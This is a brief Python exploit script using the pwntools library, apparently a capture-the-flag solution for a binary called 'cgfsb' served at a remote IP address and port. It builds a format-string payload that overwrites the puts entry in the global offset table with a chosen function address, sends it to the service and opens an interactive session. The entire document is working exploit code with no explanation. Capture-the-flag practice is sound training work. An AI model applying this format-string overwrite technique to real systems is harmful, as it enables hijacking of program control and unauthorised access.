from pwn import *

t = remote('111.198.29.45', 30838)
elf = ELF('./cgfsb')
got_puts = elf.got['puts']
ret2fun = 0x080486E8
payload = fmtstr_payload(10,{got_puts:ret2fun})
t.recvuntil('your name:\n')
t.sendline('1')
t.recvuntil('please:')
t.sendline(payload)
t.interactive()